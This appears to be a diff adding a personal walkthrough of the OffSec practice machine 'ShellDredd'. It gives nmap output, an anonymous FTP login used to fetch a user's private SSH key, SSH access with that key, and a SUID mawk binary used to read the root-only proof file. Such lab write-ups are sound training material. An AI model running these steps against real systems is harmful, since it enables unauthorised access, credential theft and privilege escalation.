@@ -1,0 +1,97 @@
+Machine onshelldred hannah
+
+stage 1 : reconnaisance
+	tool : nmap 
+	command : sudo nmap -Pn -A -T5 $IP
+result :
+	Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-19 08:35 EDT
+Nmap scan report for 192.168.192.130
+Host is up (0.27s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.49.192
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+Aggressive OS guesses: Linux 2.6.32 (91%), Linux 3.5 (91%), Linux 4.2 (91%), Synology DiskStation Manager 5.1 (90%), Linux 3.10 (90%), Linux 2.6.32 or 3.10 (90%), Linux 3.4 (90%), WatchGuard Fireware 11.8 (90%), Linux 3.18 (89%), Linux 2.6.35 (89%)
+No exact OS matches for host (test conditions non-ideal).i
+Network Distance: 2 hops
+Service Info: OS: Unix
+
+point 1 : port number 61000 of openssh was also opened but not shown above due to wrong setting up of machine by offsec
+
+2nd stage :
+ftp enumeration
+  anonymous ftp login was allowed 
+  command : ftp $IP
+  found ssh key in hannah directory
+  command : get id_rsa
+
+3rd stage 
+ Gaining access 
+ logged in to ssh using that key in ftp
+ by usename hannah
+ commands :
+  chmod 600 id_rsa
+  ssh -i  id_rsa hannah@$IP -p 61000
+ first flag found there
+ ssh -i id_rsa hannah@192.168.192.130 -p 61000                                                                 255 ⨯ 3 ⚙
+The authenticity of host '[192.168.192.130]:61000 ([192.168.192.130]:61000)' can't be established.
+ECDSA key fingerprint is SHA256:ceHZU8u3GwiQwVwrN4Ci830AmTvAmIUOlLjtVYcP2KM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.192.130]:61000' (ECDSA) to the list of known hosts.
+Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+hannah@ShellDredd:~$ ls
+local.txt  user.txt
+
+
+4th stage 
+privelige escalation
+command : find / -perm -u=s 2>/dev/null
+* .usr/bin/cpulimit file was found
+/usr/bin/mawk was intersting 
+Only file name with proof.txt is present in root as usual 
+used command mawk '//' /root/proof.txt
+'//'->regec expression for directory
+Found flag
+
+
+
+<MACHINE HACKED>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
